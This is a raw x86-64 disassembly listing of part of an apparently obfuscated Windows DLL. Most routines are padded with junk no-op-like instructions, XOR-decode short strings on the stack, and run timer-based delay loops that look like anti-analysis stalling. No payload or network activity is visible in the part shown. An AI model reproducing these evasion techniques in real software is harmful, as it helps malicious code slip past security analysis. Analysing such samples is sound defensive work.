   1800016c6:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   1800016cb:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800016cf:	83 f0 74             	xor    $0x74,%eax
   1800016d2:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   1800016d7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800016db:	83 f0 79             	xor    $0x79,%eax
   1800016de:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   1800016e3:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800016e7:	83 f0 62             	xor    $0x62,%eax
   1800016ea:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   1800016ef:	66 c7 44 24 3e 00 00 	movw   $0x0,0x3e(%rsp)
   1800016f6:	48 8d 4c 24 32       	lea    0x32(%rsp),%rcx
   1800016fb:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180001700:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180001706:	ff 15 cc 49 02 00    	call   *0x249cc(%rip)        # 0x1800260d8
   18000170c:	51                   	push   %rcx
   18000170d:	48 87 ed             	xchg   %rbp,%rbp
   180001710:	59                   	pop    %rcx
   180001711:	48 8d 0d 6e 11 02 00 	lea    0x2116e(%rip),%rcx        # 0x180022886
   180001718:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   18000171d:	ba 04 01 00 00       	mov    $0x104,%edx
   180001722:	45 31 c9             	xor    %r9d,%r9d
   180001725:	ff 15 c5 49 02 00    	call   *0x249c5(%rip)        # 0x1800260f0
   18000172b:	53                   	push   %rbx
   18000172c:	48 89 f6             	mov    %rsi,%rsi
   18000172f:	5b                   	pop    %rbx
   180001730:	4d 8d 1b             	lea    (%r11),%r11
   180001733:	48 89 f6             	mov    %rsi,%rsi
   180001736:	48 87 ed             	xchg   %rbp,%rbp
   180001739:	48 87 c9             	xchg   %rcx,%rcx
   18000173c:	48 89 db             	mov    %rbx,%rbx
   18000173f:	e8 3c f9 ff ff       	call   0x180001080
   180001744:	ff 15 26 49 02 00    	call   *0x24926(%rip)        # 0x180026070
   18000174a:	41 51                	push   %r9
   18000174c:	41 59                	pop    %r9
   18000174e:	4d 87 c0             	xchg   %r8,%r8
   180001751:	e8 4a 00 00 00       	call   0x1800017a0
   180001756:	c7 44 24 40 e2 e5 a4 	movl   $0xa4e5e2,0x40(%rsp)
   18000175d:	00 
   18000175e:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180001762:	48 8d 09             	lea    (%rcx),%rcx
   180001765:	4d 87 ff             	xchg   %r15,%r15
   180001768:	4d 8d 09             	lea    (%r9),%r9
   18000176b:	e8 c0 fe ff ff       	call   0x180001630
   180001770:	48 8d 09             	lea    (%rcx),%rcx
   180001773:	90                   	nop
   180001774:	90                   	nop
   180001775:	48 89 db             	mov    %rbx,%rbx
   180001778:	48 87 ff             	xchg   %rdi,%rdi
   18000177b:	4d 87 c9             	xchg   %r9,%r9
   18000177e:	48 87 ff             	xchg   %rdi,%rdi
   180001781:	b8 01 00 00 00       	mov    $0x1,%eax
   180001786:	48 81 c4 48 02 00 00 	add    $0x248,%rsp
   18000178d:	c3                   	ret
   18000178e:	66 90                	xchg   %ax,%ax
   180001790:	48 ff 25 f1 4a 02 00 	rex.W jmp *0x24af1(%rip)        # 0x180026288
   180001797:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000179e:	00 00 
   1800017a0:	50                   	push   %rax
   1800017a1:	41 51                	push   %r9
   1800017a3:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800017a7:	4d 89 d2             	mov    %r10,%r10
   1800017aa:	41 59                	pop    %r9
   1800017ac:	48 8d 1b             	lea    (%rbx),%rbx
   1800017af:	90                   	nop
   1800017b0:	4d 8d 09             	lea    (%r9),%r9
   1800017b3:	48 8d 09             	lea    (%rcx),%rcx
   1800017b6:	4d 87 ed             	xchg   %r13,%r13
   1800017b9:	48 87 ff             	xchg   %rdi,%rdi
   1800017bc:	41 53                	push   %r11
   1800017be:	90                   	nop
   1800017bf:	41 5b                	pop    %r11
   1800017c1:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800017c5:	48 8d 12             	lea    (%rdx),%rdx
   1800017c8:	48 87 db             	xchg   %rbx,%rbx
   1800017cb:	48 87 c9             	xchg   %rcx,%rcx
   1800017ce:	4d 89 ff             	mov    %r15,%r15
   1800017d1:	48 89 db             	mov    %rbx,%rbx
   1800017d4:	4d 87 db             	xchg   %r11,%r11
   1800017d7:	48 87 ed             	xchg   %rbp,%rbp
   1800017da:	48 87 c9             	xchg   %rcx,%rcx
   1800017dd:	4d 8d 00             	lea    (%r8),%r8
   1800017e0:	48 8d 12             	lea    (%rdx),%rdx
   1800017e3:	c7 44 24 04 14 02 00 	movl   $0x214,0x4(%rsp)
   1800017ea:	00 
   1800017eb:	58                   	pop    %rax
   1800017ec:	c3                   	ret
   1800017ed:	0f 1f 00             	nopl   (%rax)
   1800017f0:	56                   	push   %rsi
   1800017f1:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   1800017f8:	b9 4c 03 00 00       	mov    $0x34c,%ecx
   1800017fd:	e8 be 00 00 00       	call   0x1800018c0
   180001802:	4d 87 ff             	xchg   %r15,%r15
   180001805:	4d 87 c0             	xchg   %r8,%r8
   180001808:	48 87 db             	xchg   %rbx,%rbx
   18000180b:	4d 8d 24 24          	lea    (%r12),%r12
   18000180f:	48 8d 0d 52 10 02 00 	lea    0x21052(%rip),%rcx        # 0x180022868
   180001816:	ff 15 04 49 02 00    	call   *0x24904(%rip)        # 0x180026120
   18000181c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180001821:	b9 04 01 00 00       	mov    $0x104,%ecx
   180001826:	ff 15 5c 49 02 00    	call   *0x2495c(%rip)        # 0x180026188
   18000182c:	90                   	nop
   18000182d:	4d 89 db             	mov    %r11,%r11
   180001830:	41 54                	push   %r12
   180001832:	90                   	nop
   180001833:	41 5c                	pop    %r12
   180001835:	4d 89 e4             	mov    %r12,%r12
   180001838:	48 89 e4             	mov    %rsp,%rsp
   18000183b:	48 8d 09             	lea    (%rcx),%rcx
   18000183e:	90                   	nop
   18000183f:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001843:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   180001848:	ff 15 12 49 02 00    	call   *0x24912(%rip)        # 0x180026160
   18000184e:	41 56                	push   %r14
   180001850:	41 55                	push   %r13
   180001852:	41 5d                	pop    %r13
   180001854:	41 5e                	pop    %r14
   180001856:	ff 15 3c 49 02 00    	call   *0x2493c(%rip)        # 0x180026198
   18000185c:	89 c6                	mov    %eax,%esi
   18000185e:	ff 15 4c 48 02 00    	call   *0x2484c(%rip)        # 0x1800260b0
   180001864:	0f af c6             	imul   %esi,%eax
   180001867:	89 44 24 20          	mov    %eax,0x20(%rsp)
   18000186b:	8b 44 24 20          	mov    0x20(%rsp),%eax
   18000186f:	4d 87 d2             	xchg   %r10,%r10
   180001872:	4d 89 c9             	mov    %r9,%r9
   180001875:	48 87 d2             	xchg   %rdx,%rdx
   180001878:	48 87 c9             	xchg   %rcx,%rcx
   18000187b:	c7 44 24 20 fb e8 c7 	movl   $0xc7e8fb,0x20(%rsp)
   180001882:	00 
   180001883:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180001887:	41 54                	push   %r12
   180001889:	41 5c                	pop    %r12
   18000188b:	41 54                	push   %r12
   18000188d:	90                   	nop
   18000188e:	41 5c                	pop    %r12
   180001890:	48 87 d2             	xchg   %rdx,%rdx
   180001893:	90                   	nop
   180001894:	48 89 ed             	mov    %rbp,%rbp
   180001897:	90                   	nop
   180001898:	48 87 d2             	xchg   %rdx,%rdx
   18000189b:	48 89 e4             	mov    %rsp,%rsp
   18000189e:	48 89 f6             	mov    %rsi,%rsi
   1800018a1:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800018a5:	4d 8d 24 24          	lea    (%r12),%r12
   1800018a9:	48 89 db             	mov    %rbx,%rbx
   1800018ac:	4d 8d 12             	lea    (%r10),%r10
   1800018af:	b8 01 00 00 00       	mov    $0x1,%eax
   1800018b4:	48 81 c4 30 02 00 00 	add    $0x230,%rsp
   1800018bb:	5e                   	pop    %rsi
   1800018bc:	c3                   	ret
   1800018bd:	0f 1f 00             	nopl   (%rax)
   1800018c0:	41 56                	push   %r14
   1800018c2:	56                   	push   %rsi
   1800018c3:	57                   	push   %rdi
   1800018c4:	53                   	push   %rbx
   1800018c5:	48 83 ec 28          	sub    $0x28,%rsp
   1800018c9:	89 ce                	mov    %ecx,%esi
   1800018cb:	48 8b 1d c6 48 02 00 	mov    0x248c6(%rip),%rbx        # 0x180026198
   1800018d2:	ff d3                	call   *%rbx
   1800018d4:	89 c7                	mov    %eax,%edi
   1800018d6:	41 52                	push   %r10
   1800018d8:	41 5a                	pop    %r10
   1800018da:	e8 11 14 00 00       	call   0x180002cf0
   1800018df:	ff d3                	call   *%rbx
   1800018e1:	29 f8                	sub    %edi,%eax
   1800018e3:	39 f0                	cmp    %esi,%eax
   1800018e5:	73 14                	jae    0x1800018fb
   1800018e7:	4c 8b 35 aa 49 02 00 	mov    0x249aa(%rip),%r14        # 0x180026298
   1800018ee:	66 90                	xchg   %ax,%ax
   1800018f0:	41 ff d6             	call   *%r14
   1800018f3:	ff d3                	call   *%rbx
   1800018f5:	29 f8                	sub    %edi,%eax
   1800018f7:	39 f0                	cmp    %esi,%eax
   1800018f9:	72 f5                	jb     0x1800018f0
   1800018fb:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800018ff:	48 83 c4 28          	add    $0x28,%rsp
   180001903:	5b                   	pop    %rbx
   180001904:	5f                   	pop    %rdi
   180001905:	5e                   	pop    %rsi
   180001906:	41 5e                	pop    %r14
   180001908:	c3                   	ret
   180001909:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001910:	4d 89 f6             	mov    %r14,%r14
   180001913:	b8 01 00 00 00       	mov    $0x1,%eax
   180001918:	c3                   	ret
   180001919:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001920:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   180001927:	b9 c5 02 00 00       	mov    $0x2c5,%ecx
   18000192c:	e8 8f 00 00 00       	call   0x1800019c0
   180001931:	48 89 e4             	mov    %rsp,%rsp
   180001934:	ff 15 be 47 02 00    	call   *0x247be(%rip)        # 0x1800260f8
   18000193a:	89 c1                	mov    %eax,%ecx
   18000193c:	ff 15 2e 49 02 00    	call   *0x2492e(%rip)        # 0x180026270
   180001942:	4d 89 f6             	mov    %r14,%r14
   180001945:	c7 44 24 20 68 00 00 	movl   $0x68,0x20(%rsp)
   18000194c:	00 
   18000194d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001952:	ff 15 00 48 02 00    	call   *0x24800(%rip)        # 0x180026158
   180001958:	41 56                	push   %r14
   18000195a:	4d 87 d2             	xchg   %r10,%r10
   18000195d:	48 87 ed             	xchg   %rbp,%rbp
   180001960:	41 5e                	pop    %r14
   180001962:	90                   	nop
   180001963:	90                   	nop
   180001964:	c7 44 24 20 0f 84 f7 	movl   $0xf7840f,0x20(%rsp)
   18000196b:	00 
   18000196c:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180001970:	52                   	push   %rdx
   180001971:	48 87 ff             	xchg   %rdi,%rdi
   180001974:	5a                   	pop    %rdx
   180001975:	41 56                	push   %r14
   180001977:	48 89 f6             	mov    %rsi,%rsi
   18000197a:	41 5e                	pop    %r14
   18000197c:	48 89 ff             	mov    %rdi,%rdi
   18000197f:	48 89 e4             	mov    %rsp,%rsp
   180001982:	48 89 ed             	mov    %rbp,%rbp
   180001985:	4d 87 f6             	xchg   %r14,%r14
   180001988:	48 89 d2             	mov    %rdx,%rdx
   18000198b:	48 8d 09             	lea    (%rcx),%rcx
   18000198e:	48 89 ff             	mov    %rdi,%rdi
   180001991:	e8 4a 00 00 00       	call   0x1800019e0
   180001996:	4d 8d 24 24          	lea    (%r12),%r12
   18000199a:	48 89 e4             	mov    %rsp,%rsp
   18000199d:	90                   	nop
   18000199e:	90                   	nop
   18000199f:	4d 89 ed             	mov    %r13,%r13
   1800019a2:	52                   	push   %rdx
   1800019a3:	4d 87 db             	xchg   %r11,%r11
   1800019a6:	4d 87 d2             	xchg   %r10,%r10
   1800019a9:	5a                   	pop    %rdx
   1800019aa:	b8 01 00 00 00       	mov    $0x1,%eax
   1800019af:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1800019b6:	c3                   	ret
   1800019b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800019be:	00 00 
   1800019c0:	48 83 ec 28          	sub    $0x28,%rsp
   1800019c4:	ff 15 be 48 02 00    	call   *0x248be(%rip)        # 0x180026288
   1800019ca:	4d 8d 12             	lea    (%r10),%r10
   1800019cd:	48 8d 1b             	lea    (%rbx),%rbx
   1800019d0:	4d 89 db             	mov    %r11,%r11
   1800019d3:	48 89 ed             	mov    %rbp,%rbp
   1800019d6:	48 89 e4             	mov    %rsp,%rsp
   1800019d9:	90                   	nop
   1800019da:	48 83 c4 28          	add    $0x28,%rsp
   1800019de:	c3                   	ret
   1800019df:	90                   	nop
   1800019e0:	50                   	push   %rax
   1800019e1:	48 89 db             	mov    %rbx,%rbx
   1800019e4:	4d 87 c0             	xchg   %r8,%r8
   1800019e7:	90                   	nop
   1800019e8:	90                   	nop
   1800019e9:	4d 87 d2             	xchg   %r10,%r10
   1800019ec:	41 53                	push   %r11
   1800019ee:	4d 87 d2             	xchg   %r10,%r10
   1800019f1:	41 5b                	pop    %r11
   1800019f3:	4d 8d 36             	lea    (%r14),%r14
   1800019f6:	56                   	push   %rsi
   1800019f7:	48 89 f6             	mov    %rsi,%rsi
   1800019fa:	5e                   	pop    %rsi
   1800019fb:	50                   	push   %rax
   1800019fc:	58                   	pop    %rax
   1800019fd:	4d 89 d2             	mov    %r10,%r10
   180001a00:	48 89 f6             	mov    %rsi,%rsi
   180001a03:	4d 87 c9             	xchg   %r9,%r9
   180001a06:	4d 8d 00             	lea    (%r8),%r8
   180001a09:	4d 89 ed             	mov    %r13,%r13
   180001a0c:	56                   	push   %rsi
   180001a0d:	4d 87 e4             	xchg   %r12,%r12
   180001a10:	5e                   	pop    %rsi
   180001a11:	4d 89 ff             	mov    %r15,%r15
   180001a14:	4d 87 d2             	xchg   %r10,%r10
   180001a17:	c7 44 24 04 9f 02 00 	movl   $0x29f,0x4(%rsp)
   180001a1e:	00 
   180001a1f:	58                   	pop    %rax
   180001a20:	c3                   	ret
   180001a21:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001a28:	0f 1f 84 00 00 00 00 
   180001a2f:	00 
   180001a30:	48 83 ec 58          	sub    $0x58,%rsp
   180001a34:	b9 cb 02 00 00       	mov    $0x2cb,%ecx
   180001a39:	e8 82 00 00 00       	call   0x180001ac0
   180001a3e:	41 50                	push   %r8
   180001a40:	41 54                	push   %r12
   180001a42:	41 5c                	pop    %r12
   180001a44:	41 58                	pop    %r8
   180001a46:	31 c9                	xor    %ecx,%ecx
   180001a48:	ff 15 e2 46 02 00    	call   *0x246e2(%rip)        # 0x180026130
   180001a4e:	53                   	push   %rbx
   180001a4f:	48 89 db             	mov    %rbx,%rbx
   180001a52:	5b                   	pop    %rbx
   180001a53:	52                   	push   %rdx
   180001a54:	90                   	nop
   180001a55:	5a                   	pop    %rdx
   180001a56:	e8 b5 00 00 00       	call   0x180001b10
   180001a5b:	56                   	push   %rsi
   180001a5c:	5e                   	pop    %rsi
   180001a5d:	ff 15 35 47 02 00    	call   *0x24735(%rip)        # 0x180026198
   180001a63:	31 c9                	xor    %ecx,%ecx
   180001a65:	ff 15 cd 45 02 00    	call   *0x245cd(%rip)        # 0x180026038
   180001a6b:	83 f8 ff             	cmp    $0xffffffff,%eax
   180001a6e:	74 08                	je     0x180001a78
   180001a70:	89 c1                	mov    %eax,%ecx
   180001a72:	ff 15 c8 45 02 00    	call   *0x245c8(%rip)        # 0x180026040
   180001a78:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   180001a7d:	ff 15 b5 46 02 00    	call   *0x246b5(%rip)        # 0x180026138
   180001a83:	48 87 db             	xchg   %rbx,%rbx
   180001a86:	e8 f5 f5 ff ff       	call   0x180001080
   180001a8b:	52                   	push   %rdx
   180001a8c:	55                   	push   %rbp
   180001a8d:	5d                   	pop    %rbp
   180001a8e:	5a                   	pop    %rdx
   180001a8f:	c7 44 24 28 90 32 2d 	movl   $0x2d3290,0x28(%rsp)
   180001a96:	00 
   180001a97:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180001a9b:	48 8d 1b             	lea    (%rbx),%rbx
   180001a9e:	4d 87 ff             	xchg   %r15,%r15
   180001aa1:	4d 8d 09             	lea    (%r9),%r9
   180001aa4:	55                   	push   %rbp
   180001aa5:	4d 87 db             	xchg   %r11,%r11
   180001aa8:	5d                   	pop    %rbp
   180001aa9:	4d 89 c9             	mov    %r9,%r9
   180001aac:	4d 89 db             	mov    %r11,%r11
   180001aaf:	48 87 e4             	xchg   %rsp,%rsp
   180001ab2:	b8 01 00 00 00       	mov    $0x1,%eax
   180001ab7:	48 83 c4 58          	add    $0x58,%rsp
   180001abb:	c3                   	ret
   180001abc:	0f 1f 40 00          	nopl   0x0(%rax)
   180001ac0:	41 56                	push   %r14
   180001ac2:	56                   	push   %rsi
   180001ac3:	57                   	push   %rdi
   180001ac4:	53                   	push   %rbx
   180001ac5:	48 83 ec 28          	sub    $0x28,%rsp
   180001ac9:	89 ce                	mov    %ecx,%esi
   180001acb:	48 8b 1d c6 46 02 00 	mov    0x246c6(%rip),%rbx        # 0x180026198
   180001ad2:	ff d3                	call   *%rbx
   180001ad4:	89 c7                	mov    %eax,%edi
   180001ad6:	ff d3                	call   *%rbx
   180001ad8:	29 f8                	sub    %edi,%eax
   180001ada:	39 f0                	cmp    %esi,%eax
   180001adc:	73 1d                	jae    0x180001afb
   180001ade:	4c 8b 35 b3 47 02 00 	mov    0x247b3(%rip),%r14        # 0x180026298
   180001ae5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   180001aec:	00 00 00 00 
   180001af0:	41 ff d6             	call   *%r14
   180001af3:	ff d3                	call   *%rbx
   180001af5:	29 f8                	sub    %edi,%eax
   180001af7:	39 f0                	cmp    %esi,%eax
   180001af9:	72 f5                	jb     0x180001af0
   180001afb:	4d 89 ed             	mov    %r13,%r13
   180001afe:	48 83 c4 28          	add    $0x28,%rsp
   180001b02:	5b                   	pop    %rbx
   180001b03:	5f                   	pop    %rdi
   180001b04:	5e                   	pop    %rsi
   180001b05:	41 5e                	pop    %r14
   180001b07:	c3                   	ret
   180001b08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180001b0f:	00 
   180001b10:	50                   	push   %rax
   180001b11:	4d 8d 3f             	lea    (%r15),%r15
   180001b14:	4d 8d 36             	lea    (%r14),%r14
   180001b17:	41 57                	push   %r15
   180001b19:	90                   	nop
   180001b1a:	41 5f                	pop    %r15
   180001b1c:	56                   	push   %rsi
   180001b1d:	4d 87 db             	xchg   %r11,%r11
   180001b20:	5e                   	pop    %rsi
   180001b21:	90                   	nop
   180001b22:	90                   	nop
   180001b23:	90                   	nop
   180001b24:	90                   	nop
   180001b25:	48 89 f6             	mov    %rsi,%rsi
   180001b28:	90                   	nop
   180001b29:	4d 89 db             	mov    %r11,%r11
   180001b2c:	41 51                	push   %r9
   180001b2e:	50                   	push   %rax
   180001b2f:	58                   	pop    %rax
   180001b30:	41 59                	pop    %r9
   180001b32:	4d 87 c0             	xchg   %r8,%r8
   180001b35:	4d 8d 3f             	lea    (%r15),%r15
   180001b38:	48 87 ed             	xchg   %rbp,%rbp
   180001b3b:	c7 44 24 04 96 03 00 	movl   $0x396,0x4(%rsp)
   180001b42:	00 
   180001b43:	58                   	pop    %rax
   180001b44:	c3                   	ret
   180001b45:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   180001b4c:	00 00 00 00 
   180001b50:	4d 89 ed             	mov    %r13,%r13
   180001b53:	48 8d 00             	lea    (%rax),%rax
   180001b56:	48 87 f6             	xchg   %rsi,%rsi
   180001b59:	4d 87 db             	xchg   %r11,%r11
   180001b5c:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001b60:	53                   	push   %rbx
   180001b61:	5b                   	pop    %rbx
   180001b62:	b8 01 00 00 00       	mov    $0x1,%eax
   180001b67:	c3                   	ret
   180001b68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180001b6f:	00 
   180001b70:	41 52                	push   %r10
   180001b72:	41 5a                	pop    %r10
   180001b74:	b8 01 00 00 00       	mov    $0x1,%eax
   180001b79:	c3                   	ret
   180001b7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001b80:	56                   	push   %rsi
   180001b81:	48 83 ec 60          	sub    $0x60,%rsp
   180001b85:	b9 3d 01 00 00       	mov    $0x13d,%ecx
   180001b8a:	e8 c1 00 00 00       	call   0x180001c50
   180001b8f:	48 89 ff             	mov    %rdi,%rdi
   180001b92:	48 8d 1b             	lea    (%rbx),%rbx
   180001b95:	4d 89 ff             	mov    %r15,%r15
   180001b98:	4d 89 c0             	mov    %r8,%r8
   180001b9b:	48 8d 3f             	lea    (%rdi),%rdi
   180001b9e:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   180001ba3:	48 89 f1             	mov    %rsi,%rcx
   180001ba6:	ff 15 cc 45 02 00    	call   *0x245cc(%rip)        # 0x180026178
   180001bac:	41 57                	push   %r15
   180001bae:	48 87 c9             	xchg   %rcx,%rcx
   180001bb1:	41 5f                	pop    %r15
   180001bb3:	4d 87 c9             	xchg   %r9,%r9
   180001bb6:	55                   	push   %rbp
   180001bb7:	41 52                	push   %r10
   180001bb9:	41 5a                	pop    %r10
   180001bbb:	5d                   	pop    %rbp
   180001bbc:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180001bc1:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180001bc8:	00 
   180001bc9:	4c 8d 05 b2 0c 02 00 	lea    0x20cb2(%rip),%r8        # 0x180022882
   180001bd0:	b9 00 04 00 00       	mov    $0x400,%ecx
   180001bd5:	ba 00 01 00 00       	mov    $0x100,%edx
   180001bda:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180001be0:	ff 15 3a 46 02 00    	call   *0x2463a(%rip)        # 0x180026220
   180001be6:	48 8d 09             	lea    (%rcx),%rcx
   180001be9:	4d 8d 1b             	lea    (%r11),%r11
   180001bec:	4d 87 ed             	xchg   %r13,%r13
   180001bef:	ff 15 c3 44 02 00    	call   *0x244c3(%rip)        # 0x1800260b8
   180001bf5:	48 89 c1             	mov    %rax,%rcx
   180001bf8:	ff 15 92 45 02 00    	call   *0x24592(%rip)        # 0x180026190
   180001bfe:	c7 44 24 30 de f9 02 	movl   $0x2f9de,0x30(%rsp)
   180001c05:	00 
   180001c06:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180001c0a:	48 87 e4             	xchg   %rsp,%rsp
   180001c0d:	48 89 f6             	mov    %rsi,%rsi
   180001c10:	4d 87 e4             	xchg   %r12,%r12
   180001c13:	4d 8d 00             	lea    (%r8),%r8
   180001c16:	48 8d 00             	lea    (%rax),%rax
   180001c19:	48 87 d2             	xchg   %rdx,%rdx
   180001c1c:	48 89 f6             	mov    %rsi,%rsi
   180001c1f:	4d 87 c9             	xchg   %r9,%r9
   180001c22:	90                   	nop
   180001c23:	90                   	nop
   180001c24:	4d 8d 00             	lea    (%r8),%r8
   180001c27:	4d 89 f6             	mov    %r14,%r14
   180001c2a:	e8 41 00 00 00       	call   0x180001c70
   180001c2f:	50                   	push   %rax
   180001c30:	41 55                	push   %r13
   180001c32:	41 5d                	pop    %r13
   180001c34:	58                   	pop    %rax
   180001c35:	4d 87 db             	xchg   %r11,%r11
   180001c38:	4d 87 d2             	xchg   %r10,%r10
   180001c3b:	b8 01 00 00 00       	mov    $0x1,%eax
   180001c40:	48 83 c4 60          	add    $0x60,%rsp
   180001c44:	5e                   	pop    %rsi
   180001c45:	c3                   	ret
   180001c46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   180001c4d:	00 00 00 
   180001c50:	48 83 ec 28          	sub    $0x28,%rsp
   180001c54:	31 d2                	xor    %edx,%edx
   180001c56:	ff 15 34 46 02 00    	call   *0x24634(%rip)        # 0x180026290
   180001c5c:	52                   	push   %rdx
   180001c5d:	5a                   	pop    %rdx
   180001c5e:	90                   	nop
   180001c5f:	48 83 c4 28          	add    $0x28,%rsp
   180001c63:	c3                   	ret
   180001c64:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001c6b:	00 00 00 00 00 
   180001c70:	50                   	push   %rax
   180001c71:	48 8d 09             	lea    (%rcx),%rcx
   180001c74:	90                   	nop
   180001c75:	4d 87 c9             	xchg   %r9,%r9
   180001c78:	90                   	nop
   180001c79:	52                   	push   %rdx
   180001c7a:	48 89 f6             	mov    %rsi,%rsi
   180001c7d:	5a                   	pop    %rdx
   180001c7e:	90                   	nop
   180001c7f:	48 89 d2             	mov    %rdx,%rdx
   180001c82:	90                   	nop
   180001c83:	51                   	push   %rcx
   180001c84:	90                   	nop
   180001c85:	59                   	pop    %rcx
   180001c86:	53                   	push   %rbx
   180001c87:	52                   	push   %rdx
   180001c88:	5a                   	pop    %rdx
   180001c89:	5b                   	pop    %rbx
   180001c8a:	4d 87 c9             	xchg   %r9,%r9
   180001c8d:	4d 87 d2             	xchg   %r10,%r10
   180001c90:	4d 87 f6             	xchg   %r14,%r14
   180001c93:	52                   	push   %rdx
   180001c94:	4d 89 ff             	mov    %r15,%r15
   180001c97:	5a                   	pop    %rdx
   180001c98:	c7 44 24 04 86 00 00 	movl   $0x86,0x4(%rsp)
   180001c9f:	00 
   180001ca0:	58                   	pop    %rax
   180001ca1:	c3                   	ret
   180001ca2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001ca9:	1f 84 00 00 00 00 00 
   180001cb0:	48 81 ec 48 02 00 00 	sub    $0x248,%rsp
   180001cb7:	b9 6a 03 00 00       	mov    $0x36a,%ecx
   180001cbc:	e8 df 00 00 00       	call   0x180001da0
   180001cc1:	52                   	push   %rdx
   180001cc2:	5a                   	pop    %rdx
   180001cc3:	4d 89 ed             	mov    %r13,%r13
   180001cc6:	e8 65 f5 ff ff       	call   0x180001230
   180001ccb:	c7 44 24 2c 69 00 00 	movl   $0x69,0x2c(%rsp)
   180001cd2:	00 
   180001cd3:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180001cd7:	83 f0 4c             	xor    $0x4c,%eax
   180001cda:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180001cdf:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180001ce3:	83 f0 3d             	xor    $0x3d,%eax
   180001ce6:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180001ceb:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180001cef:	83 f0 2c             	xor    $0x2c,%eax
   180001cf2:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180001cf7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180001cfb:	83 f0 24             	xor    $0x24,%eax
   180001cfe:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180001d03:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180001d07:	83 f0 39             	xor    $0x39,%eax
   180001d0a:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180001d0f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180001d13:	83 f0 4c             	xor    $0x4c,%eax
   180001d16:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180001d1b:	66 c7 44 24 3e 00 00 	movw   $0x0,0x3e(%rsp)
   180001d22:	48 8d 4c 24 32       	lea    0x32(%rsp),%rcx
   180001d27:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180001d2c:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180001d32:	ff 15 e0 42 02 00    	call   *0x242e0(%rip)        # 0x180026018
   180001d38:	41 52                	push   %r10
   180001d3a:	41 5a                	pop    %r10
   180001d3c:	ff 15 0e 44 02 00    	call   *0x2440e(%rip)        # 0x180026150
   180001d42:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180001d46:	48 87 c9             	xchg   %rcx,%rcx
   180001d49:	90                   	nop
   180001d4a:	4d 87 d2             	xchg   %r10,%r10
   180001d4d:	e8 ae 00 00 00       	call   0x180001e00
   180001d52:	ff 15 a0 43 02 00    	call   *0x243a0(%rip)        # 0x1800260f8
   180001d58:	c7 44 24 40 bc 38 3e 	movl   $0x3e38bc,0x40(%rsp)
   180001d5f:	00 
   180001d60:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180001d64:	50                   	push   %rax
   180001d65:	41 51                	push   %r9
   180001d67:	41 59                	pop    %r9
   180001d69:	58                   	pop    %rax
   180001d6a:	90                   	nop
   180001d6b:	90                   	nop
   180001d6c:	4d 89 c0             	mov    %r8,%r8
   180001d6f:	51                   	push   %rcx
   180001d70:	90                   	nop
   180001d71:	59                   	pop    %rcx
   180001d72:	41 54                	push   %r12
   180001d74:	41 52                	push   %r10
   180001d76:	41 5a                	pop    %r10
   180001d78:	41 5c                	pop    %r12
   180001d7a:	41 53                	push   %r11
